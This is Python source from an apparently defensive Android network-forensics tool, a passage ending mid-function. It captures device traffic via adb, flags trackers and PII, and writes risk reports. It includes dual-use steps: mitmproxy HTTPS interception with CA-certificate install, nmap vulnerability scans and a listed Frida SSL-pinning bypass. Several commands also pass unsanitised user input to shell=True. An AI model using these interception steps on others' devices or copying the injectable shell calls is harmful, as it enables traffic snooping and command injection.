def deep_traffic_capture(adb: ADB, dev=None, st=None, data=None) -> None:
    """Root-tcpdump-Capture oder logcat-basiertes Tiefen-Capture."""
    ui.clear()
    ui.rule("📡 TIEFEN-TRAFFIC-CAPTURE", ui.BCYAN)
    print()

    # Prüfe verfügbare Tools
    which_out = adb.shell("which tcpdump tshark strace 2>/dev/null; "
                          "ls /system/bin/tcpdump /data/local/tmp/tcpdump 2>/dev/null")
    has_tcpdump = "tcpdump" in which_out
    root_test = adb.shell("id 2>/dev/null")
    has_root = "uid=0" in root_test or "root" in root_test.lower()

    print(f"  tcpdump verfügbar: {'✓' if has_tcpdump else '✗ (nicht installiert)'}")
    print(f"  Root-Zugriff:      {'✓' if has_root else '✗ (eingeschränkter Modus)'}")
    print()

    ch = ui.menu("Capture-Methode", [
        ("1", f"tcpdump (30s) {'[ROOT]' if not has_root else '✓'}  → PCAP exportieren"),
        ("2", "logcat Deep-Capture (kein Root) → Alle Netz-Events 60s"),
        ("3", "dumpsys connectivity Snapshot  → vollständiger Netz-Status"),
        ("4", "tcpdump installieren (push binary nach /data/local/tmp/)"),
    ], back_label="Zurück")
    if ch == "back":
        return

    ts = int(time.time())
    ts_str = time.strftime("%Y-%m-%d %H:%M:%S")

    if ch == "1":
        if not has_root:
            ui.warn("Root benötigt! Versuche trotzdem …")
        ui.info("Starte tcpdump (30 Sekunden) …")
        cap_path = "/data/local/tmp/panzer_cap.pcap"
        cmd = (f"su -c 'timeout 30 tcpdump -i any -w {cap_path} "
               f"-s 0 2>/dev/null; echo DONE'" if has_root
               else f"timeout 30 tcpdump -i any -w {cap_path} -s 0 2>/dev/null; echo DONE")
        print(f"  {ui.GREY}Läuft 30 Sekunden … (Gerät aktiv nutzen für Traffic){ui.RESET}")
        out = adb.shell(cmd)
        print(f"  {ui.GREY}{out[:200]}{ui.RESET}")
        # PCAP herunterladen
        local_pcap = os.path.join(OUT, f"pcap_{ts}.pcap")
        os.makedirs(OUT, exist_ok=True)
        pull_out = adb.shell(f"ls -la {cap_path} 2>/dev/null")
        if "pcap" in pull_out or "cap" in pull_out:
            try:
                import subprocess
                result = subprocess.run(
                    ["adb", "pull", cap_path, local_pcap],
                    capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    ui.ok(f"PCAP gespeichert: {local_pcap}")
                    print(f"  {ui.GREY}Analysieren: tshark -r {local_pcap} -T fields -e ip.dst -e dns.qry.name{ui.RESET}")
                else:
                    ui.warn(f"Pull fehlgeschlagen: {result.stderr[:100]}")
            except Exception as exc:
                ui.warn(f"Subprocess-Fehler: {exc}")
        else:
            ui.warn("PCAP-Datei nicht gefunden auf Gerät.")

    elif ch == "2":
        ui.info("Starte logcat Deep-Capture (60s) …")
        print(f"  {ui.GREY}Erfasse alle Netzwerk-Ereignisse …{ui.RESET}")
        # logcat 60s
        import threading
        capture_lines: list[str] = []
        stop_flag = [False]

        def _capture_worker():
            start = time.monotonic()
            while not stop_flag[0] and time.monotonic() - start < 60:
                raw = adb.shell(
                    "logcat -d 2>/dev/null | grep -iE 'dns|http|connect|ssl|tls|"
                    "network|traffic|socket|upload|download' | tail -n 50")
                for line in raw.splitlines():
                    if line not in capture_lines:
                        capture_lines.append(line)
                time.sleep(2)

        t = threading.Thread(target=_capture_worker, daemon=True)
        t.start()
        for i in range(60):
            sys.stdout.write(f"\r  Erfasse … {60-i}s verbleibend  ({len(capture_lines)} Events)  ")
            sys.stdout.flush()
            time.sleep(1)
        stop_flag[0] = True
        t.join(timeout=3)
        print()

        # Analysieren
        domains = list(set(_parse_dns_from_logcat("\n".join(capture_lines))))
        fn = os.path.join(OUT, f"deep_capture_{ts}.txt")
        with open(fn, "w") as f:
            f.write(f"# Deep-Traffic-Capture {ts_str}\n")
            f.write(f"# Dauer: 60s  |  Events: {len(capture_lines)}  |  Domains: {len(domains)}\n\n")
            f.write("── ERKANNTE DOMAINS ──────────────────\n")
            for d in sorted(domains):
                flag = " [TRACKER]" if _is_tracker(d) else ""
                flag += " [MALWARE]" if _is_malware(d) else ""
                cat, _ = _cat_domain(d)
                f.write(f"  {d:<50}  [{cat}]{flag}\n")
            f.write("\n── RAW EVENTS ────────────────────────\n")
            f.write("\n".join(capture_lines))
        ui.ok(f"Capture gespeichert: {fn} ({len(capture_lines)} Events, {len(domains)} Domains)")

    elif ch == "3":
        ui.info("Erstelle vollständigen Netz-Status-Snapshot …")
        snap_cmds = [
            ("Verbindungen", "ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null"),
            ("Routing-Tabelle", "ip route 2>/dev/null || netstat -rn 2>/dev/null"),
            ("Netzwerk-Interfaces", "ip addr 2>/dev/null || ifconfig 2>/dev/null"),
            ("DNS-Props", "getprop | grep -iE 'dns|resolv' 2>/dev/null"),
            ("Connectivity dumpsys", "dumpsys connectivity 2>/dev/null | head -n 80"),
            ("WiFi-Status", "dumpsys wifi 2>/dev/null | head -n 60"),
            ("VPN-Status", "dumpsys vpn 2>/dev/null | head -n 30"),
            ("/proc/net/tcp6", "cat /proc/net/tcp6 2>/dev/null | head -n 30"),
        ]
        fn = os.path.join(OUT, f"net_snapshot_{ts}.txt")
        with open(fn, "w") as f:
            f.write(f"# Netz-Snapshot {ts_str}\n\n")
            for label, cmd in snap_cmds:
                out = adb.shell(cmd).strip()
                f.write(f"## {label}\n{out}\n\n")
                if out:
                    ui.kv(label, out[:80] + ("…" if len(out) > 80 else ""))
        ui.ok(f"Snapshot: {fn}")

    elif ch == "4":
        ui.rule("tcpdump installieren", ui.BCYAN)
        print(f"\n  {ui.GREY}Methode 1: Via Magisk / Android-Paketmanager")
        print(f"  Methode 2: Statisches Binary von https://github.com/extremecoders-re/tcpdump-android")
        print(f"\n  Manuell installieren:")
        print(f"    adb push tcpdump /data/local/tmp/tcpdump")
        print(f"    adb shell chmod +x /data/local/tmp/tcpdump{ui.RESET}")

    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
# 13. FORENSIK-KOMPLETT-BERICHT
# ═══════════════════════════════════════════════════════════════════════════════

def full_forensics_report(adb: ADB, dev=None, st=None, data=None) -> None:
    """Erstellt vollständigen Netzwerk-Forensik-Bericht ohne Interaktion."""
    ui.clear()
    ui.rule("🗂️  FORENSIK-KOMPLETT-BERICHT", ui.BCYAN)
    ts  = int(time.time())
    ts_str = time.strftime("%Y-%m-%d %H:%M:%S")
    print()
    ui.info(f"Starte vollständige Forensik-Analyse  [{ts_str}] …")
    print()

    results: dict = {
        "timestamp": ts_str,
        "domains": [],
        "trackers": [],
        "malware_domains": [],
        "connections": [],
        "dns_servers": [],
        "tls_issues": [],
        "pii_findings": [],
        "apps_internet": 0,
        "high_risk_apps": [],
    }

    # 1. Domains
    ui.info("[1/8] DNS-Domains sammeln …")
    raw_dns = adb.shell(
        "logcat -d -t 500 2>/dev/null | grep -iE 'dns|getaddrinfo|resolv' | tail -n 200")
    all_domains = list(set(_parse_dns_from_logcat(raw_dns)))
    results["domains"] = sorted(all_domains)
    results["trackers"] = [d for d in all_domains if _is_tracker(d)]
    results["malware_domains"] = [d for d in all_domains if _is_malware(d)]
    print(f"    → {len(all_domains)} Domains  |  {len(results['trackers'])} Tracker  |  "
          f"{len(results['malware_domains'])} Malware")

    # 2. Verbindungen
    ui.info("[2/8] Verbindungen …")
    conn_raw = adb.shell("ss -tnp 2>/dev/null | grep ESTAB | head -n 20")
    conns = []
    for line in conn_raw.splitlines():
        parts = line.split()
        if len(parts) >= 5:
            remote = parts[4]
            proc = parts[-1] if '(' in parts[-1] else ""
            proc = re.sub(r'.*"([^"]+)".*', r'\1', proc)
            org, country = _lookup_ip_org(remote.split(':')[0])
            conns.append({"remote": remote, "app": proc, "org": org, "country": country})
    results["connections"] = conns
    print(f"    → {len(conns)} aktive Verbindungen")

    # 3. DNS-Server
    ui.info("[3/8] DNS-Server …")
    for prop in ["net.dns1", "net.dns2", "dhcp.wlan0.dns1", "dhcp.rmnet0.dns1"]:
        v = adb.shell(f"getprop {prop} 2>/dev/null").strip()
        if v and re.match(r'\d+\.', v):
            results["dns_servers"].append(v)
    print(f"    → DNS-Server: {', '.join(set(results['dns_servers'])) or '—'}")

    # 4. TLS-Issues
    ui.info("[4/8] TLS-Analyse …")
    tls_raw = adb.shell(
        "logcat -d -t 200 2>/dev/null | grep -iE 'ssl|tls|cert|handshake|x509' | tail -n 100")
    for v in ["TLSv1.0", "TLSv1.1", "SSLv3"]:
        if v in tls_raw:
            results["tls_issues"].append(f"Veraltete TLS-Version: {v}")
    if "CertificateException" in tls_raw or "SSLHandshakeException" in tls_raw:
        results["tls_issues"].append("Zertifikat-Fehler erkannt")
    print(f"    → {len(results['tls_issues'])} TLS-Probleme")

    # 5. PII
    ui.info("[5/8] PII-Scan …")
    pii_raw = adb.shell(
        "logcat -d -t 300 2>/dev/null | grep -iE 'dns|url|http|upload|send' | tail -n 200")
    pii_pats = [
        ("IMEI", r'\b\d{15}\b'),
        ("GPS", r'\b-?\d{1,3}\.\d{5,}[,&]-?\d{1,3}\.\d{5,}'),
        ("E-Mail", r'\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b'),
        ("UUID", r'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b'),
    ]
    for name, pat in pii_pats:
        m = re.search(pat, pii_raw)
        if m:
            results["pii_findings"].append(f"{name}: {m.group(0)[:30]}")
    print(f"    → {len(results['pii_findings'])} PII-Treffer")

    # 6. Internet-Apps (schnell)
    ui.info("[6/8] Internet-Permission-Apps …")
    internet_raw = adb.shell(
        "dumpsys package 2>/dev/null | grep -c 'android.permission.INTERNET'")
    try:
        results["apps_internet"] = int(internet_raw.strip().splitlines()[0])
    except Exception:
        results["apps_internet"] = 0
    print(f"    → {results['apps_internet']} Apps mit INTERNET-Permission")

    # 7. Risiko-Apps
    ui.info("[7/8] Risiko-Apps …")
    risk_raw = adb.shell(
        "dumpsys package 2>/dev/null | grep -B 5 'RECEIVE_BOOT_COMPLETED' | grep 'Package \\['")
    for m in re.finditer(r'Package \[([^\]]+)\]', risk_raw):
        results["high_risk_apps"].append(m.group(1))
    print(f"    → {len(results['high_risk_apps'])} Apps mit Auto-Start + Netz")

    # 8. Bericht schreiben
    ui.info("[8/8] Bericht schreiben …")
    fn_txt  = os.path.join(OUT, f"forensik_report_{ts}.txt")
    fn_json = os.path.join(OUT, f"forensik_report_{ts}.json")

    risk_score = (
        len(results["malware_domains"]) * 10 +
        len(results["trackers"]) * 2 +
        len(results["pii_findings"]) * 5 +
        len(results["tls_issues"]) * 3
    )
    risk_label = ("KRITISCH" if risk_score >= 30 else
                  "HOCH" if risk_score >= 15 else
                  "MITTEL" if risk_score >= 5 else "NIEDRIG")

    with open(fn_txt, "w") as f:
        f.write("=" * 72 + "\n")
        f.write("  AndroidPanzer – Netzwerk-Forensik-Bericht\n")
        f.write(f"  Erstellt: {ts_str}\n")
        f.write(f"  Risiko-Score: {risk_score}  ({risk_label})\n")
        f.write("=" * 72 + "\n\n")
        f.write("── EXECUTIVE SUMMARY ──────────────────────────────────────────────\n\n")
        f.write(f"  Domains gesamt:       {len(all_domains)}\n")
        f.write(f"  Tracker-Domains:      {len(results['trackers'])}\n")
        f.write(f"  Malware-Domains:      {len(results['malware_domains'])}\n")
        f.write(f"  Aktive Verbindungen:  {len(conns)}\n")
        f.write(f"  PII-Lecks:            {len(results['pii_findings'])}\n")
        f.write(f"  TLS-Probleme:         {len(results['tls_issues'])}\n")
        f.write(f"  Internet-Apps:        {results['apps_internet']}\n\n")
        if results["malware_domains"]:
            f.write("── MALWARE-DOMAINS (KRITISCH) ──────────────────────────────────────\n")
            for d in results["malware_domains"]:
                f.write(f"  ☠ {d}\n")
            f.write("\n")
        f.write("── TRACKER-DOMAINS ─────────────────────────────────────────────────\n")
        for d in results["trackers"]:
            cat, _ = _cat_domain(d)
            f.write(f"  T {d:<50}  [{cat}]\n")
        f.write("\n── ALLE DOMAINS ────────────────────────────────────────────────────\n")
        for d in sorted(all_domains):
            cat, _ = _cat_domain(d)
            flag = " [TRACKER]" if _is_tracker(d) else ""
            flag += " [MALWARE]" if _is_malware(d) else ""
            f.write(f"  {d:<50}  [{cat}]{flag}\n")
        f.write("\n── VERBINDUNGEN ────────────────────────────────────────────────────\n")
        for c in conns:
            f.write(f"  {c['remote']:<25}  {c['org']:<22}  {c['country']}  [{c['app']}]\n")
        f.write("\n── PII-BEFUNDE ─────────────────────────────────────────────────────\n")
        for p in results["pii_findings"]:
            f.write(f"  {p}\n")
        f.write("\n── TLS-PROBLEME ────────────────────────────────────────────────────\n")
        for t in results["tls_issues"]:
            f.write(f"  {t}\n")
        f.write("\n── EMPFEHLUNGEN ────────────────────────────────────────────────────\n")
        if results["malware_domains"]:
            f.write("  ⚠ SOFORT: Malware-Domains blockieren (Option 7 → Malware blockieren)\n")
        if results["trackers"]:
            f.write("  → Tracker blockieren via DNS (Quad9/AdGuard) oder hosts-File\n")
        if results["pii_findings"]:
            f.write("  → PII-Lecks prüfen: Betroffene Apps deinstallieren oder einschränken\n")
        if results["tls_issues"]:
            f.write("  → Apps mit TLS 1.0/1.1 aktualisieren\n")
        f.write("  → Internet-Permission auf Minimum reduzieren (Option 10)\n")
        f.write("  → DoT/DoH aktivieren: AdGuard DNS (Option 7 → DNS setzen)\n")
        f.write("\n" + "=" * 72 + "\n")

    with open(fn_json, "w") as f:
        json.dump(results, f, indent=2)

    # Ergebnis anzeigen
    print()
    col = (ui.BRED if risk_label == "KRITISCH" else
           ui.BYELLOW if risk_label in ("HOCH", "MITTEL") else
           ui.BGREEN)
    print(f"  {col}{ui.BOLD}RISIKO-SCORE: {risk_score} ({risk_label}){ui.RESET}\n")
    print(f"  {ui.BGREEN}✓ Bericht: {fn_txt}{ui.RESET}")
    print(f"  {ui.BGREEN}✓ JSON:    {fn_json}{ui.RESET}")
    if results["malware_domains"]:
        for _ in range(3):
            sys.stdout.write(f"\r  {ui.BRED}{ui.BOLD}  ☠ MALWARE-DOMAINS AKTIV — SOFORT HANDELN!  {ui.RESET}")
            sys.stdout.flush()
            time.sleep(0.25)
            sys.stdout.write(f"\r{' '*60}")
            sys.stdout.flush()
            time.sleep(0.12)
        print()
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
# 15. EXTRA TOOLS – Host-seitige Netzwerk-Analyse
# ═══════════════════════════════════════════════════════════════════════════════

def extra_tools(adb: ADB, dev=None, st=None, data=None) -> None:
    """Host-seitige EXTRA TOOLS: mitmproxy, tshark, nmap, openssl, arp-scan, Burp."""
    import subprocess

    def _run(cmd: str, timeout: int = 15) -> str:
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=timeout)
            return (r.stdout + r.stderr).strip()
        except subprocess.TimeoutExpired:
            return "(Timeout)"
        except Exception as exc:
            return f"(Fehler: {exc})"

    def _which(tool: str) -> bool:
        return bool(_run(f"which {tool} 2>/dev/null"))

    # Tool-Verfügbarkeit prüfen
    tools_status = {
        "mitmproxy":  _which("mitmproxy"),
        "mitmdump":   _which("mitmdump"),
        "tshark":     _which("tshark"),
        "wireshark":  _which("wireshark"),
        "nmap":       _which("nmap"),
        "arp-scan":   _which("arp-scan"),
        "openssl":    _which("openssl"),
        "tcpdump":    _which("tcpdump"),
        "netcat":     _which("nc") or _which("netcat"),
        "curl":       _which("curl"),
        "dig":        _which("dig"),
        "frida":      _which("frida"),
    }

    while True:
        ui.clear()
        ui.rule("🛠️  EXTRA TOOLS — Host-seitige Netzwerk-Analyse", ui.BYELLOW)
        print(f"\n  {ui.GREY}Tools auf diesem Kali-System verfügbar:{ui.RESET}\n")
        for t, avail in tools_status.items():
            col = ui.BGREEN if avail else ui.GREY
            mark = "✓" if avail else "✗"
            print(f"  {col}{mark}  {t:<18}{ui.RESET}", end="")
        print("\n")

        ch = ui.menu("Extra-Tool", [
            ("1",  "🔴 mitmproxy HTTPS-Intercept    (Proxy auf Port 8080, Gerät umleiten)"),
            ("2",  "📡 tshark Live-Capture           (Netzwerk-Interface wählen, live Domains)"),
            ("3",  "🗺  nmap Gerät-Scan              (offene Ports, Services, OS-Erkennung)"),
            ("4",  "📶 arp-scan Netz-Discovery       (alle Geräte im LAN finden)"),
            ("5",  "🔐 openssl Cert-Check            (TLS-Zertifikat direkt abrufen + analysieren)"),
            ("6",  "🔍 dig/nslookup DNS-Analyse      (Domain auflösen, Reverse-DNS, MX, TXT)"),
            ("7",  "🌐 curl HTTP-Request-Analyse     (Headers · Redirect-Chain · Response)"),
            ("8",  "🔌 netcat Port-Listener          (TCP/UDP Listener für Verbindungstests)"),
            ("9",  "🎯 Frida HTTPS-Unpinning         (SSL-Pinning umgehen via Frida-Script)"),
            ("10", "🏗  Burp Suite Setup-Anleitung   (Android-Proxy, CA-Cert, adb-Tunnel)"),
            ("11", "📦 Fehlende Tools installieren   (apt install · pip install)"),
            ("12", "🔄 adb-Reverse-Proxy einrichten  (Gerät → Kali mitmproxy Tunnel)"),
        ], back_label="Hauptmenü")
        if ch == "back":
            return

        # ── 1: mitmproxy ──────────────────────────────────────────────────────
        if ch == "1":
            ui.clear()
            ui.rule("🔴 mitmproxy HTTPS-Intercept", ui.BRED)
            if not tools_status["mitmproxy"] and not tools_status["mitmdump"]:
                ui.warn("mitmproxy nicht installiert!")
                print(f"  {ui.GREY}sudo apt install mitmproxy  ODER  pip install mitmproxy{ui.RESET}")
                ui.pause(); continue

            # Kali-IP ermitteln
            kali_ip = _run("ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \\K[\\d.]+'")
            if not kali_ip:
                kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'")

            print(f"\n  {ui.BOLD}Kali-IP:  {kali_ip or '???'}{ui.RESET}")
            print(f"\n  {ui.BOLD}Schritt 1 – Gerät-Proxy setzen:{ui.RESET}")
            print(f"  {ui.GREY}adb shell settings put global http_proxy {kali_ip or 'KALI_IP'}:8080{ui.RESET}")
            print(f"\n  {ui.BOLD}Schritt 2 – CA-Zertifikat installieren:{ui.RESET}")
            ca_path = os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem")
            print(f"  {ui.GREY}# CA-Cert nach Gerät übertragen:")
            print(f"  adb push {ca_path} /data/local/tmp/mitmproxy-ca.pem")
            print(f"  # Auf Gerät installieren (User-CA): Einstellungen → Sicherheit → CA-Zertifikat{ui.RESET}")
            print(f"\n  {ui.BOLD}Schritt 3 – mitmproxy starten:{ui.RESET}")
            if ui.confirm("mitmproxy jetzt starten (Web-UI auf :8081)?", True):
                print(f"\n  {ui.GREY}Starte mitmdump im Hintergrund …{ui.RESET}")
                log_path = os.path.join(OUT, f"mitm_{int(time.time())}.log")
                subprocess.Popen(
                    f"mitmdump -p 8080 -w {log_path} 2>&1 &",
                    shell=True)
                time.sleep(1)
                # Prüfen ob läuft
                ps = _run("pgrep -a mitmdump 2>/dev/null")
                if ps:
                    ui.ok(f"mitmdump läuft (PID: {ps.split()[0]})")
                    ui.ok(f"Log: {log_path}")
                else:
                    ui.warn("mitmdump konnte nicht gestartet werden.")
                print(f"\n  {ui.GREY}Beenden: kill $(pgrep mitmdump){ui.RESET}")
                print(f"\n  {ui.BOLD}Proxy wieder entfernen:{ui.RESET}")
                print(f"  {ui.GREY}adb shell settings delete global http_proxy{ui.RESET}")
            ui.pause()

        # ── 2: tshark ─────────────────────────────────────────────────────────
        elif ch == "2":
            ui.clear()
            ui.rule("📡 tshark Live-Capture", ui.BCYAN)
            if not tools_status["tshark"]:
                ui.warn("tshark nicht installiert!")
                print(f"  {ui.GREY}sudo apt install tshark{ui.RESET}")
                ui.pause(); continue

            # Interfaces
            ifaces_raw = _run("tshark -D 2>/dev/null")
            print(f"\n  {ui.BOLD}Verfügbare Interfaces:{ui.RESET}")
            print(f"  {ui.GREY}{ifaces_raw[:600]}{ui.RESET}")
            print(f"\n  {ui.BOLD}Interface eingeben (z.B. eth0, wlan0):{ui.RESET} ", end="")
            try:
                iface = input().strip() or "any"
            except (EOFError, KeyboardInterrupt):
                iface = "any"

            print(f"\n  {ui.GREY}Starte tshark auf {iface} (30s) …{ui.RESET}\n")
            ts = int(time.time())
            pcap_out = os.path.join(OUT, f"tshark_{ts}.pcap")
            dns_out  = os.path.join(OUT, f"tshark_dns_{ts}.txt")

            # 30s capture
            cap_result = _run(
                f"timeout 30 tshark -i {iface} -w {pcap_out} "
                f"-f 'port 53 or port 80 or port 443' 2>&1", timeout=35)

            # DNS-Domains extrahieren
            dns_result = _run(
                f"tshark -r {pcap_out} -Y dns -T fields "
                f"-e dns.qry.name 2>/dev/null | sort -u", timeout=10)

            if dns_result.strip():
                print(f"  {ui.BOLD}Erfasste DNS-Queries:{ui.RESET}")
                domains_found = [d for d in dns_result.splitlines() if d.strip()]
                for d in domains_found[:30]:
                    cat, _ = _cat_domain(d)
                    col = ui.BRED if _is_malware(d) else (ui.BYELLOW if _is_tracker(d) else ui.BCYAN)
                    print(f"  {col}{d:<45}{ui.RESET}  [{cat}]")
                if len(domains_found) > 30:
                    print(f"  {ui.GREY}… und {len(domains_found)-30} weitere{ui.RESET}")
                with open(dns_out, "w") as f:
                    f.write(f"# tshark DNS-Queries {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    for d in domains_found:
                        cat, _ = _cat_domain(d)
                        flag = " [TRACKER]" if _is_tracker(d) else ""
                        flag += " [MALWARE]" if _is_malware(d) else ""
                        f.write(f"{d:<50}  [{cat}]{flag}\n")
                ui.ok(f"PCAP:  {pcap_out}")
                ui.ok(f"DNS:   {dns_out}")
            else:
                ui.warn("Keine DNS-Queries erfasst (oder kein Traffic auf Interface).")
                if os.path.exists(pcap_out):
                    ui.ok(f"PCAP trotzdem gespeichert: {pcap_out}")
            ui.pause()

        # ── 3: nmap ───────────────────────────────────────────────────────────
        elif ch == "3":
            ui.clear()
            ui.rule("🗺  nmap Gerät-Scan", ui.BCYAN)
            if not tools_status["nmap"]:
                ui.warn("nmap nicht installiert!")
                print(f"  {ui.GREY}sudo apt install nmap{ui.RESET}")
                ui.pause(); continue

            # Gerät-IP via ADB
            dev_ip = adb.shell(
                "ip -4 addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
            dev_ip = dev_ip.strip().splitlines()[0] if dev_ip.strip() else ""
            if not dev_ip:
                dev_ip = adb.shell(
                    "ifconfig wlan0 2>/dev/null | grep 'inet addr' | awk '{print $2}' | cut -d: -f2")
                dev_ip = dev_ip.strip()

            if not dev_ip:
                print(f"\n  {ui.GREY}Gerät-IP eingeben:{ui.RESET} ", end="")
                try:
                    dev_ip = input().strip()
                except (EOFError, KeyboardInterrupt):
                    dev_ip = ""

            if not dev_ip:
                ui.warn("Keine Gerät-IP ermittelbar.")
                ui.pause(); continue

            print(f"\n  Gerät-IP: {ui.BOLD}{dev_ip}{ui.RESET}\n")

            scan_ch = ui.menu("Scan-Typ", [
                ("1", "Schnell-Scan (Top-100 Ports)"),
                ("2", "Vollscan (alle 65535 Ports)"),
                ("3", "Service + OS-Erkennung (-sV -O)"),
                ("4", "Vuln-Scan (--script vuln)"),
            ], back_label="Zurück")
            if scan_ch == "back":
                continue

            cmds = {
                "1": f"nmap -F --open {dev_ip}",
                "2": f"nmap -p- --open {dev_ip}",
                "3": f"nmap -sV -O --open {dev_ip}",
                "4": f"nmap --script vuln {dev_ip}",
            }
            cmd = cmds.get(scan_ch, cmds["1"])
            print(f"  {ui.GREY}{cmd}{ui.RESET}\n")
            print(f"  {ui.GREY}Läuft … (kann 1-5 Minuten dauern){ui.RESET}\n")
            result = _run(cmd, timeout=300)
            print(result[:3000])
            fn = os.path.join(OUT, f"nmap_{dev_ip.replace('.','_')}_{int(time.time())}.txt")
            with open(fn, "w") as f:
                f.write(f"# nmap {cmd}\n\n{result}")
            ui.ok(f"Gespeichert: {fn}")
            ui.pause()

        # ── 4: arp-scan ───────────────────────────────────────────────────────
        elif ch == "4":
            ui.clear()
            ui.rule("📶 arp-scan Netz-Discovery", ui.BCYAN)
            if not tools_status["arp-scan"]:
                ui.warn("arp-scan nicht installiert!")
                print(f"  {ui.GREY}sudo apt install arp-scan{ui.RESET}")
                ui.pause(); continue

            iface_raw = _run("ip route | grep default | awk '{print $5}' | head -1")
            iface = iface_raw.strip() or "eth0"
            print(f"\n  Interface: {ui.BOLD}{iface}{ui.RESET}")
            print(f"  {ui.GREY}Scanne lokales Netz …{ui.RESET}\n")
            result = _run(f"sudo arp-scan --interface={iface} --localnet 2>/dev/null", timeout=30)
            if "sudo" in result and "password" in result.lower():
                result = _run(f"arp-scan --interface={iface} --localnet 2>/dev/null", timeout=30)
            print(result[:3000])
            ui.pause()

        # ── 5: openssl cert ───────────────────────────────────────────────────
        elif ch == "5":
            ui.clear()
            ui.rule("🔐 openssl Zertifikat-Analyse", ui.BCYAN)
            if not tools_status["openssl"]:
                ui.warn("openssl nicht installiert!")
                ui.pause(); continue

            print(f"\n  {ui.BOLD}Domain oder IP eingeben:{ui.RESET} ", end="")
            try:
                target = input().strip()
            except (EOFError, KeyboardInterrupt):
                target = ""
            if not target:
                ui.pause(); continue

            host, _, port = target.partition(":")
            port = port or "443"
            print(f"\n  {ui.GREY}Verbinde zu {host}:{port} …{ui.RESET}\n")

            cert_raw = _run(
                f"echo | timeout 10 openssl s_client -connect {host}:{port} "
                f"-servername {host} 2>/dev/null", timeout=15)
            cert_info = _run(
                f"echo | timeout 10 openssl s_client -connect {host}:{port} "
                f"-servername {host} 2>/dev/null | openssl x509 -noout -text 2>/dev/null", timeout=15)

            # TLS-Version
            tls_m = re.search(r'Protocol\s*:\s*(TLS\S+|SSL\S+)', cert_raw)
            print(f"  TLS-Version: {ui.BOLD}{tls_m.group(1) if tls_m else '?'}{ui.RESET}")
            # Cipher
            cipher_m = re.search(r'Cipher\s*:\s*(\S+)', cert_raw)
            print(f"  Cipher:      {ui.BOLD}{cipher_m.group(1) if cipher_m else '?'}{ui.RESET}")
            # Subject
            subj_m = re.search(r'Subject:.*?CN\s*=\s*([^\n,/]+)', cert_info)
            print(f"  Subject CN:  {ui.BOLD}{subj_m.group(1).strip() if subj_m else '?'}{ui.RESET}")
            # Issuer
            iss_m = re.search(r'Issuer:.*?O\s*=\s*([^\n,/]+)', cert_info)
            print(f"  Ausgestellt von: {iss_m.group(1).strip() if iss_m else '?'}")
            # Gültigkeit
            nb_m  = re.search(r'Not Before\s*:\s*([^\n]+)', cert_info)
            na_m  = re.search(r'Not After\s*:\s*([^\n]+)', cert_info)
            print(f"  Gültig von:  {nb_m.group(1).strip() if nb_m else '?'}")
            print(f"  Gültig bis:  {na_m.group(1).strip() if na_m else '?'}")
            # SANs
            san_m = re.search(r'Subject Alternative Name:([^\n]+(?:\n\s+[^\n]+)*)', cert_info)
            if san_m:
                print(f"  SANs:        {san_m.group(1).strip()[:120]}")
            # Warnung bei schwachen Parametern
            if tls_m and tls_m.group(1) in ("TLSv1.0", "TLSv1.1", "SSLv3"):
                print(f"\n  {ui.BRED}⚠ VERALTETE TLS-VERSION: {tls_m.group(1)}{ui.RESET}")
            ui.pause()

        # ── 6: dig/nslookup ───────────────────────────────────────────────────
        elif ch == "6":
            ui.clear()
            ui.rule("🔍 dig/nslookup DNS-Analyse", ui.BCYAN)
            print(f"\n  {ui.BOLD}Domain eingeben:{ui.RESET} ", end="")
            try:
                domain = input().strip()
            except (EOFError, KeyboardInterrupt):
                domain = ""
            if not domain:
                ui.pause(); continue

            queries = [
                ("A-Record",     f"dig +short A {domain} 2>/dev/null || nslookup -type=A {domain}"),
                ("AAAA-Record",  f"dig +short AAAA {domain} 2>/dev/null"),
                ("MX-Record",    f"dig +short MX {domain} 2>/dev/null"),
                ("TXT-Record",   f"dig +short TXT {domain} 2>/dev/null"),
                ("NS-Record",    f"dig +short NS {domain} 2>/dev/null"),
                ("CNAME",        f"dig +short CNAME {domain} 2>/dev/null"),
                ("Reverse-DNS",  f"dig +short -x $(dig +short A {domain} 2>/dev/null | head -1) 2>/dev/null"),
                ("WHOIS (kurz)", f"whois {domain} 2>/dev/null | grep -iE 'registr|creat|expir|org|country' | head -10"),
            ]
            for label, cmd in queries:
                out = _run(cmd, timeout=8).strip()
                if out:
                    ui.kv(label, out[:200])
            ui.pause()

        # ── 7: curl HTTP-Analyse ──────────────────────────────────────────────
        elif ch == "7":
            ui.clear()
            ui.rule("🌐 curl HTTP-Request-Analyse", ui.BCYAN)
            if not tools_status["curl"]:
                ui.warn("curl nicht installiert!")
                ui.pause(); continue

            print(f"\n  {ui.BOLD}URL eingeben (z.B. https://example.com):{ui.RESET} ", end="")
            try:
                url = input().strip()
            except (EOFError, KeyboardInterrupt):
                url = ""
            if not url:
                ui.pause(); continue
            if not url.startswith("http"):
                url = "https://" + url

            # Headers + Status
            print(f"\n  {ui.GREY}Analysiere {url} …{ui.RESET}\n")
            headers = _run(
                f"curl -s -I -L --max-redirs 5 --connect-timeout 8 "
                f"-A 'Mozilla/5.0' '{url}' 2>&1", timeout=15)
            # Redirect-Chain
            chain = _run(
                f"curl -s -L --max-redirs 10 -o /dev/null -w '%{{url_effective}}\\n' "
                f"--connect-timeout 8 '{url}' 2>/dev/null", timeout=15)

            print(f"  {ui.BOLD}Headers:{ui.RESET}")
            for line in headers.splitlines()[:20]:
                col = ui.BGREEN if line.startswith("HTTP") else ui.GREY
                print(f"  {col}{line}{ui.RESET}")
            if chain.strip() and chain.strip() != url:
                print(f"\n  {ui.BOLD}Redirect → {ui.BCYAN}{chain.strip()}{ui.RESET}")

            # Sicherheits-Headers checken
            sec_headers = {
                "Strict-Transport-Security": ("HSTS", ui.BGREEN),
